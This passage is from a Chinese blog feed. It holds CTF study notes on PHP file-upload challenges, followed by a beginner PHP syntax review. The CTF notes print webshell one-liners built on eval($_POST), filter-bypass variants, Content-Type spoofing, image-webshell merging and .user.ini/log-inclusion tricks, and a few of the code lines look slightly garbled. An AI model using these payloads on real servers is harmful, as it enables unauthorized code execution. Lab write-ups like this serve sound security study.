pan><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="最常用的马"><a href="#最常用的马" class="headerlink" title="最常用的马"></a>最常用的马</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?php phpinfo(); @eval($_POST[&#39;shell&#39;]); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>这样写的目的是有phpinfo()的回显，如果显示了<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717003904.png">的回显，则为能够解析木马，否则不能解析<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3></li><li>system函数用于执行外部程序，并且<strong>显示输出</strong><pre class="line-numbers language-none"><code class="language-none">system(string $command,int &amp;$return_var&#x3D;?):string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>返回值为可选的，可以省略</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716122452.png"></li></ol><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><ol><li>eval()函数把字符串按照PHP代码来计算</li><li>该字符串必须是合法的PHP代码，以分号结尾</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716124148.png"></li></ol><h3 id="tac-cat"><a href="#tac-cat" class="headerlink" title="tac/cat"></a>tac/cat</h3><ol><li>用来显示文件，tac是反向（向前）的顺序列出文件的内容,tac最重要的作用是对HTML的注释内容进行破坏，从而使注释内容不需要查看源代码即可回显到主页面</li><li>cat是读取其后所指文件内容并将其输出到标准输出设备上</li></ol><h3 id="-1"><a href="#-1" class="headerlink" title="@"></a>@</h3><ol><li>@是可以屏蔽函数执行过程中遇到的问题而产生的一些错误，警告信息，这样用户就看不到程序的出错信息</li><li>屏蔽了出错文件的路径等信息，安全性高，但是就没有回显了，所以可以不加@来获取到更多的回显信息</li></ol><h3 id="array-pop"><a href="#array-pop" class="headerlink" title="array_pop()"></a>array_pop()</h3><ol><li>可以接受一个post或者get传的参数,这样就可以绕过过滤掉中括号和大括号无法使用$_POST[‘shell’]的情况<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($POST));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717152902.png"></p><h3 id="js前端过滤，ctfshow"><a href="#js前端过滤，ctfshow" class="headerlink" title="js前端过滤，ctfshow"></a>js前端过滤，ctfshow</h3><ol><li>查看网页源代码，查看js，发现前端过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094646.png"></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094739.png"></li><li>修改前端js，屏蔽过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094808.png"></li><li>文件可以上传成功<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094857.png"></li><li>1=system(“ls ./“);在本地找不到东西</li><li>1=system(“ls /“);在根目录下也找不到东西<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716114825.png"></li><li>1=system(“ls ../“);在上级目录找到flag<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716114952.png"></li><li>构造语句1=system(“tac ../flag.php”);看到flag<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115039.png"></li></ol><h3 id="文件后缀绕过攻击"><a href="#文件后缀绕过攻击" class="headerlink" title="文件后缀绕过攻击"></a>文件后缀绕过攻击</h3><ol><li>服务端代码中限制了某些后缀的文件不允许上传，但是有些apache是允许解析其它文件后缀的</li><li>在apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的拓展名不能识别，就继续向左判断，直到遇到可以解析的文件后缀为止</li><li>例如：1.php.xxxx，xxxx不能解析，所以向左解析后缀php</li><li>或者可以大写一个字母，绕过弱过滤，例如php写为phP,大写一个字母</li></ol><h3 id="文件类型绕过攻击-后端不能单一校验"><a href="#文件类型绕过攻击-后端不能单一校验" class="headerlink" title="文件类型绕过攻击,后端不能单一校验"></a>文件类型绕过攻击,后端不能单一校验</h3><ol><li>在客户端上传文件时，通过burp抓包，当上传一个php格式的文件时，和上传一个jpg格式的<strong>Content-type不一致</strong></li><li>如果<strong>服务端</strong>是<strong>通过Content-type来判断</strong>文件的类型，就存在被绕过的可能，因为Content-type的值是<strong>客户端传递的</strong>，是<strong>可以任意修改的</strong></li><li>所以上传一个php文件格式时，在burp中修改<strong>Content-type</strong>的值为image/jpeg，就可以绕过后端的检测</li></ol><h4 id="使用-FLIES-“file”-“type”-后端过滤"><a href="#使用-FLIES-“file”-“type”-后端过滤" class="headerlink" title="使用$_FLIES[“file”][“type”]后端过滤"></a>使用$_FLIES[“file”][“type”]后端过滤</h4><ol><li>$_FILES[“file”][“type”]是客户端请求数据包中的Contant-type,可以通过修改Contant-type来绕过</li><li>ctfshow例题152</li><li>直接上传，发现<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716165636.png"></li><li>上来先找js有没有前端过滤，发现js有前端过滤，修改为php<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115444.png"></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115448.png">还是不能够上传，应该就是后端有过滤了</li><li>抓个包，首先看看是不是文件名后缀的问题，<strong>大写一个字母</strong>，例如phP，发现还是被过滤掉了</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115845.png">，<strong>修改文件的Content-type</strong>,和前端所要求的文件类型一致，为image/png<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716120958.png">,就可以上传成功了<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716121004.png"></li></ol><h5 id="方法2：用蚁剑去连接"><a href="#方法2：用蚁剑去连接" class="headerlink" title="方法2：用蚁剑去连接"></a>方法2：用蚁剑去连接</h5><ol><li>绕过前端js过滤，后端改包之后能够上传</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004035.png"></li><li>用蚁剑去连接，右键点击添加数据，url里面填url加上上传马的路径（马所在的位置），密码为post传的参数，即shell<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004227.png">，如果出现连接成功则为ok</li><li>在上传文件管理器中单机右键，选择在此处打开终端<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004350.png"></li><li>一级一级目录地去寻找flag，<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004304.png"></li></ol><h4 id="使用getimagesize-后端过滤"><a href="#使用getimagesize-后端过滤" class="headerlink" title="使用getimagesize()后端过滤"></a>使用getimagesize()后端过滤</h4><ol><li>getimagesize()可以获取到图片的宽高，如果上传的不是图片文件，getimagesize()就获取不到信息，返回false，取反!getimagesize()就为true<pre class="line-numbers language-none"><code class="language-none">if(!getimagesize($_FILES[&quot;file&quot;][&quot;type_name&quot;]))&#123;    exit();  &#x2F;&#x2F;不满足就退出&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>此时可以将一个图片和一个webshell合并为一个文件<pre class="line-numbers language-none"><code class="language-none">cat image.png webshell.php&gt;image.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>也可以用010editor放到最后</li></ol><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><ol><li>上传.user.ini进行文件上传绕过</li><li>一定注意这是一个隐藏配置文件，最前面要加点，是”.user.ini”</li></ol><h5 id="user-ini文件-常用配置项"><a href="#user-ini文件-常用配置项" class="headerlink" title=".user.ini文件,常用配置项"></a>.user.ini文件,常用配置项</h5><ol><li>php支持基于每个目录的.ini文件配置</li><li>除了主php.ini文件之外，php还会在每个目录下扫描ini文件，从被执行的php文件所在目录开始，一直上升到web根目录，（$_SERVER[‘DOCUMENT_ROOT’]所指定的），如果被执行的php文件在web根目录之外，则只扫描该目录</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011205.png"></li><li>常用配置项：S<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011252.png"></li><li>假设包含1.txt<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011331.png">,重命名为.user.ini</li></ol><h3 id="对文件内容过滤"><a href="#对文件内容过滤" class="headerlink" title="对文件内容过滤"></a>对文件内容过滤</h3><h4 id="常用绕过方法"><a href="#常用绕过方法" class="headerlink" title="常用绕过方法"></a>常用绕过方法</h4><ol><li>绕过php：短标签：<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; ?&gt;代替php标签，&lt;?&#x3D; ?&gt;标签可以直接把php的结果输出，&lt;?&#x3D; ?&gt;的结果和&lt;?php ?&gt;完全一样<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>绕过空格：使用转义字符绕过’\t’;或者使用%09也是tab的URL编码，php反引号中的字符串会被当作命令执行</li><li>绕过[]:使用{}即可，大括号和中括号的作用在php中等价<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717120017.png"></li><li>绕过[]和{}:使用array_pop()函数，函数内部写传参的方式，例如：array_pop($_POST);<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717150830.png">，以字符串的形式返回执行的语句<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717151007.png">，可以配合eval()函数使用</li><li>绕过分号;:最后一句的分号可以不要，且可以使用?&gt;去绕过分号</li></ol><h4 id="不允许使用php字样，使用短标签绕过，例题：ctfshow154-ctfshow155"><a href="#不允许使用php字样，使用短标签绕过，例题：ctfshow154-ctfshow155" class="headerlink" title="不允许使用php字样，使用短标签绕过，例题：ctfshow154,ctfshow155"></a>不允许使用php字样，使用短标签绕过，例题：ctfshow154,ctfshow155</h4><ol><li>上传一个png文件，抓包</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717111434.png"></li><li>改包，改上传文件名称为’.user.ini’,文件内容采用’auto_append_file=1.txt’;</li><li>直接上传一个1.txt文件，内容为简单的一句话木马发现报错<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717111650.png"></li><li>直接上传一个内容为php的，前端为png的文件内容，发现还是报错，二分法判断前和后哪里的问题，发现是后面不允许使用php字样</li><li>使用短标签不适用’php’字样,发现可以上传<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717112101.png"><pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;@eval($_POST(&#39;shell&#39;))&gt;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>连蚁剑，找flag即可<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717112120.png"></li><li>连蚁剑的时候，路径写到和.user.ini和1.txt同级的位置，即到.user.ini的上一级目录，/upload的位置</li></ol><h4 id="不允许使用中括号-，ctfshow156"><a href="#不允许使用中括号-，ctfshow156" class="headerlink" title="不允许使用中括号[]，ctfshow156"></a>不允许使用中括号[]，ctfshow156</h4><ol><li>直接使用大括号{}替换中括号[]<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; eval($_POST&#123;&#39;shell&#39;&#125;) ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="中括号和大括号都过滤了，还过滤了分号，ctfshow157"><a href="#中括号和大括号都过滤了，还过滤了分号，ctfshow157" class="headerlink" title="中括号和大括号都过滤了，还过滤了分号，ctfshow157"></a>中括号和大括号都过滤了，还过滤了分号，ctfshow157</h4><ol><li>这个时候我们可以使用array_pop()函数,函数内部写接收的参数，使用逃逸传参，参数以post或者get方式传入，但是还是不行<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($_POST[&#39;1&#39;]);&amp;1&#x3D;system(&quot;待执行命令&quot;));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>进一步发现过滤了分号，最后位置的语句可以不带分号结尾,即可以上传成功<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($_POST[1])?&gt;&amp;1&#x3D;system(&quot;待执行语句&quot;))?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>用蚁剑连接到*.user.ini的上一级目录位置*，开终端搞就行</li></ol><h3 id="web159，对大小括号进行过滤-对特殊路径字符进行过滤"><a href="#web159，对大小括号进行过滤-对特殊路径字符进行过滤" class="headerlink" title="web159，对大小括号进行过滤,对特殊路径字符进行过滤"></a>web159，对大小括号进行过滤,对特殊路径字符进行过滤</h3><ol><li>使用文件包含进行绕过</li><li>对’log’字样进行过滤，使用.进行拼接<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;include&#39;var&#x2F;l&#39;.&#39;og&#x2F;nginx&#x2F;access.l&#39;.&#39;og&#39;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="重复改包的技巧"><a href="#重复改包的技巧" class="headerlink" title="重复改包的技巧"></a>重复改包的技巧</h3><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717150132.png"></li><li>host的位置是域名去掉前面的http头和最后那里的‘/’而成的</li></ol><h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><h4 id="使用文件包含"><a href="#使用文件包含" class="headerlink" title="使用文件包含"></a>使用文件包含</h4><ol><li>/var/log/nginx/access.log</li><li>因为对log有过滤，所以可以使用php的’.’去进行拼接</li><li>‘/var/l’.’og/nginx/access.l’.’og’</li></ol><h4 id="题"><a href="#题" class="headerlink" title="题"></a>题</h4><ol><li>题中过滤了空格，小括号</li><li>可以使用文件包含去做</li><li>先上传一个.user.ini,内容为auto_append_file=1.txt</li><li>1.txt中写一句话木马</li><li><?=include1'/var/l'.'og/nginx/access.l'.'og'?>，这个地方因为过滤了空格，我们考虑使用空白换行符，但是不能直接换行，否则解码的时候空格和换行符的URL编码相同<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220728161132.png"></li><li>把上面的1位置的hex值由31改为0d即可上传</li><li>后面接着改UA，连接蚁剑即可</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php基本语法复习</title>
      <link href="/php%E8%AF%AD%E6%B3%95/"/>
      <url>/php%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="一种创建动态交互性站点的强有力的服务端脚本语言"><a href="#一种创建动态交互性站点的强有力的服务端脚本语言" class="headerlink" title="一种创建动态交互性站点的强有力的服务端脚本语言"></a>一种创建动态交互性站点的强有力的服务端脚本语言</h2><h2 id="环境：phpstudy搭建而成"><a href="#环境：phpstudy搭建而成" class="headerlink" title="环境：phpstudy搭建而成"></a>环境：phpstudy搭建而成</h2><ol><li>在phpstudy下的WWW下的文件夹下编写php程序</li><li>保存到WWW的下一级目录下</li><li>可以使用回环地址加上php文件名运行程序</li><li>例如:127.0.0.1/文件名.php</li></ol><h2 id="什么是php文件"><a href="#什么是php文件" class="headerlink" title="什么是php文件"></a>什么是php文件</h2><ol><li>php文件可以包含文本、HTML、CSS、以及PHP代码</li><li>php代码在服务器上执行，而结果以纯文本的形式返回浏览器</li><li>文件名后缀为.php</li></ol><h2 id="php能够做什么"><a href="#php能够做什么" class="headerlink" title="php能够做什么"></a>php能够做什么</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220708183356.png"></p><h2 id="语法知识"><a href="#语法知识" class="headerlink" title="语法知识"></a>语法知识</h2><h3 id="php脚本可以放在文档中的任何位置"><a href="#php脚本可以放在文档中的任何位置" class="headerlink" title="php脚本可以放在文档中的任何位置"></a>php脚本可以放在文档中的任何位置</h3><h3 id="开头结尾"><a href="#开头结尾" class="headerlink" title="开头结尾"></a>开头结尾</h3><ol><li>php脚本以’ &lt;?php ‘开头</li><li>以’ ?&gt; ‘结尾</li></ol><h3 id="内建php输出文本函数"><a href="#内建php输出文本函数" class="headerlink" title="内建php输出文本函数"></a>内建php输出文本函数</h3><ol><li>echo<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;h1&gt;我的第一张 PHP 页面&lt;&#x2F;h1&gt;&lt;?phpecho &quot;Hello World!&quot;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="php语句以分号结尾（；）"><a href="#php语句以分号结尾（；）" class="headerlink" title="php语句以分号结尾（；）"></a>php语句以分号结尾（；）</h3><ol><li>php代码块的关闭标签也会自动表明分号，因此在php代码的最后一行不必使用分号</li></ol><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><ol><li>php的注释和c++的注释符号一样<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;#&#x2F;*    此处为注释*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="php对大小写敏感性问题"><a href="#php对大小写敏感性问题" class="headerlink" title="php对大小写敏感性问题"></a>php对大小写敏感性问题</h3><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;?phpECHO &quot;Hello World!&lt;br&gt;&quot;;echo &quot;Hello World!&lt;br&gt;&quot;;EcHo &quot;Hello World!&lt;br&gt;&quot;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>以上的三种方法等价</li><li>所有<strong>用户定义的****函数，类和关键词</strong>都对大小写不敏感，例如if else echo等等</li><li>在php中所有变量都对大小写敏感,试运行以下代码<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;?php$color&#x3D;&quot;red&quot;;echo &quot;My car is &quot; . $color . &quot;&lt;br&gt;&quot;;echo &quot;My house is &quot; . $COLOR . &quot;&lt;br&gt;&quot;;echo &quot;My boat is &quot; . $coLOR . &quot;&lt;br&gt;&quot;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="变量的命名规则"><a href="#变量的命名规则" class="headerlink" title="变量的命名规则"></a>变量的命名规则</h4><ol><li>变量以$符号开头，其后是变量的名称</li><li>变量名称必须以字母或者下划线开头</li><li>变量名称不能以数字开头</li><li>变量名称只能包含字母数字下划线</li><li>变量名称对大小写敏感</li></ol><h4 id="变量的创建"><a href="#变量的创建" class="headerlink" title="变量的创建"></a>变量的创建</h4><ol><li>php没有创建变量的命令</li><li>变量会在首次赋值时被创建</li><li>如果为变量赋值为文本，用引号包围该值</li></ol><h4 id="变量的引用"><a href="#变量的引用" class="headerlink" title="变量的引用"></a>变量的引用</h4><ol><li>变量的引用也需要加‘$’</li><li>取数组中的某一个元素加大括号{数组[index]}</li></ol><h4 id="PHP-是一门类型松散的语言"><a href="#PHP-是一门类型松散的语言" class="headerlink" title="PHP 是一门类型松散的语言"></a>PHP 是一门类型松散的语言</h4><ol><li>php在创建变量的时候不必告知php变量的数据类型</li></ol><h4 id="php变量作用域"><a href="#php变量作用域" class="headerlink" title="php变量作用域"></a>php变量作用域</h4><ol><li>可以在任意位置对变量进行声明</li><li>三个作用域：<strong>local global static</strong><h5 id="local和global"><a href="#local和global" class="headerlink" title="local和global"></a>local和global</h5></li><li>global是全局作用域，可以在函数外访问</li><li>local是局部作用域，只能在函数内部进行访问</li><li>在函数外部定义的是global</li><li>函数内部定义的是local</li><li>global关键词，用于<strong>在函数内部访问全局变量</strong>，要做到这一点，要在<strong>函数内部变量前面使用global关键词</strong>，（这一点和python不同，python中global是将局部变量转换为全局变量，而php中是在函数内部<strong>调用全局变量</strong>），<strong>如果删除global，将不能在函数内部调用全局变量</strong></li><li>php同时在名为 $GLOBALS[index]的数组中存储了所有的全局变量，下标存有变量名，用 \ $GLOBALS[index]即可访问到名为index的全局变量</li></ol><h5 id="static关键词"><a href="#static关键词" class="headerlink" title="static关键词"></a>static关键词</h5><ol><li>通常，在函数完成或执行后，会删除所有变量，不过有时我需要不删除某个局部变量</li><li>使用static关键词<pre class="line-numbers language-none"><code class="language-none">&lt;?phpfunction myTest() &#123;  static $x&#x3D;0;  echo $x;  $x++;&#125;myTest();myTest();myTest();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>每当函数被调用时，这个变量所存储的信息都是函数最后一次被调用时包含的信息（不会重新赋值）</li><li>但是这个变量仍然是局部变量</li></ol><h3 id="echo和print"><a href="#echo和print" class="headerlink" title="echo和print"></a>echo和print</h3><h4 id="差异"><a href="#差异" class="headerlink" title="差异"></a>差异</h4><ol><li>echo能够输出一个以上的字符串</li><li>print只能输出一个字符串，始终返回值为1</li><li>echo比print稍快，因为他不返回任何值</li></ol><h4 id="print"><a href="#print" class="headerlink" title="print"></a>print</h4><ol><li>有无括号都可使用（**print和print()**）<pre class="line-numbers language-none"><code class="language-none">&lt;?php$txt1&#x3D;&quot;Learn PHP&quot;;$txt2&#x3D;&quot;W3School.com.cn&quot;;$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;SAAB&quot;);print $txt1;print &quot;&lt;br&gt;&quot;;print &quot;Study PHP at $txt2&quot;;print &quot;My car is a &#123;$cars[0]&#125;&quot;;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>取数组中的某一个元素需要加大括号，大括号内部是数组名[index]</li></ol><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><ol><li>字符串是字符序列</li><li>单双括号等价</li></ol><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="var-dump-函数"><a href="#var-dump-函数" class="headerlink" title="var_dump()函数"></a>var_dump()函数</h3><ol><li>返回变量的数据类型和值</li><li>值自动转化为十进制的值</li></ol><h3 id="php对象"><a href="#php对象" class="headerlink" title="php对象"></a>php对象</h3><ol><li>对象是存储数据和有关如何处理数据的信息的数据类型</li><li>php中必须明确地声明对象</li><li>首先必须声明对象的类，使用class关键词，类是包含属性和方法的结构</li><li>在对象类中定义数据类型，然后在该类的实例中使用此数据类型</li></ol><h3 id="NULL值"><a href="#NULL值" class="headerlink" title="NULL值"></a>NULL值</h3><ol><li>表示变量无量</li><li>NULL是NULL唯一可能的值</li><li>NULL值表示变量是否为空，用于区分字符串与空值数据库</li></ol><h2 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h2><h3 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h3><ol><li>返回字符串的长度<pre class="line-numbers language-none"><code class="language-none">&lt;?php    echo strlen(&quot;hello world&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="字符串中单词个数的统计"><a href="#字符串中单词个数的统计" class="headerlink" title="字符串中单词个数的统计"></a>字符串中单词个数的统计</h3><ol><li>str_word_count()<pre class="line-numbers language-none"><code class="language-none">&lt;?php    echo str_word_count(&quot;hello world&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="strrev"><a href="#strrev" class="headerlink" title="strrev()"></a>strrev()</h3><ol><li>用于反转字符串<pre class="line-numbers language-none"><code class="language-none">&lt;?php    echo strrev(&quot;hello world&quot;); &#x2F;&#x2F;输出dlrow olleh?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h3><ol><li>用于检索字符串内指定的字符或文本</li><li>如果找到匹配，则会返回首个匹配的字符位置，如果未找到，则会返回false</li><li>strpos(“原字符串”，“待检索字符串”);<pre class="line-numbers language-none"><code class="language-none">&lt;?php    echo strpos(&quot;hello world&quot;,&quot;world&quot;); &#x2F;&#x2F;输出为6，下标从0开始（很特殊的是sql中的substr）;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace()"></a>str_replace()</h3><ol><li>用一些字符串替换字符串中的另一些字符<pre class="line-numbers language-none"><code class="language-none">&lt;?php    echo str_replace(&quot;被替换字符&quot;,&quot;替换字符&quot;，“原string”);    echo str_replace(&quot;world&quot;,&quot;kitty&quot;,&quot;hello world&quot;); &#x2F;&#x2F;结果为hello kitty?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><h3 id="常量是单个值的标识符，脚本中无法改变该值"><a href="#常量是单个值的标识符，脚本中无法改变该值" class="headerlink" title="常量是单个值的标识符，脚本中无法改变该值"></a>常量是单个值的标识符，脚本中无法改变该值</h3><h3 id="有效的常量名以字符或下划线开头，（常量名称前面没有-符号）"><a href="#有效的常量名以字符或下划线开头，（常量名称前面没有-符号）" class="headerlink" title="有效的常量名以字符或下划线开头，（常量名称前面没有$符号）"></a>有效的常量名以字符或下划线开头，（<strong>常量名称前面没有$符号</strong>）</h3><h3 id="设置php变量"><a href="#设置php变量" class="headerlink" title="设置php变量"></a>设置php变量</h3><ol><li>define()函数，一共三个参数</li><li>首个参数定义常量的名称</li><li>第二个参数定义常量的值</li><li>第三个参数规定常量名对大小写是否敏感，默认为false<pre class="line-numbers language-none"><code class="language-none">&lt;?php    define(&quot;GREETING&quot;,&quot;Welcome&quot;)；    echo GTEETING; &#x2F;&#x2F;创建了一个对大小写不敏感的GREETING常量，值为Welcome;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="常量是全局的，而且可以贯穿整个脚本使用"><a href="#常量是全局的，而且可以贯穿整个脚本使用" class="headerlink" title="常量是全局的，而且可以贯穿整个脚本使用"></a>常量是全局的，而且可以贯穿整个脚本使用</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php    define(&quot;GREETING&quot;,&quot;Welcome&quot;);    function mytest() &#123;        echo GREETING;    &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>在函数内使用了一个常量，即使它在函数外定义</li></ol><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id=""><a href="#" class="headerlink" title="+ - * / %"></a>+ - * / %</h3><ol><li>$x + $y</li><li>$x - $y</li><li>$x * $y</li><li>$x / $y</li><li>$x % $y<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $x&#x3D;17;    $y&#x3D;8;    echo ($x+$y);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><ol><li>用于向变量写值</li><li>基础赋值运算符为=</li><li>右赋给左</li></ol><h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><h4 id="-1"><a href="#-1" class="headerlink" title="."></a>.</h4><ol><li>. 表示串接，$txt1=”hello” $txt2=$txt1.”world”;//$txt2为hello world</li><li>.= 串接赋值，$txt1=”hello” $txt1.=”world”;//$txt1为hello world (类似于+=)</li></ol><h3 id="递增递减"><a href="#递增递减" class="headerlink" title="递增递减"></a>递增递减</h3><ol><li>++$x</li><li>–$x</li><li>$x++</li><li>$x–</li></ol><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><ol><li>and</li><li>or 至少有一个就返回true</li><li>xor 